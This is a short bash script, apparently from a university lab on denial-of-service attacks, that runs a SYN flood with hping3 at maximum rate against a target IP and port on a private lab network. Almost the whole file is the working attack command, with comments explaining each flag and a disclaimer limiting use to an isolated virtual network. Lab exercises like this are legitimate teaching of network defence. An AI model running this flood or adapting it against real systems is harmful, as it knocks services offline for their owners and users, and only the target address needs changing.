#!/bin/bash
# ===========================================================================
# SYN Flood simulation — CMU-CS 376 DoS/DDoS Lab
# RUNNING ON: Kali Linux (Attacker) — 192.168.100.10
# TARGET: Windows (Victim) — 192.168.100.20:8000
#
# DISCLAIMER: Execute only within the isolated VirtualBox Internal Network
# environment ("intnet-lab"). Do not use outside of academic purposes.
# ===========================================================================

TARGET_IP="192.168.100.20"
TARGET_PORT=8000

echo "[*] Starting SYN Flood against ${TARGET_IP}:${TARGET_PORT}"
echo "[*] Press Ctrl+C to stop"

# -S     : send packet with SYN flag (TCP handshake initiation without completion)
# -p     : destination port (8000 — Python HTTP Server on victim)
# --flood: send packets at maximum possible rate without waiting for responses
sudo hping3 -S -p ${TARGET_PORT} --flood ${TARGET_IP}
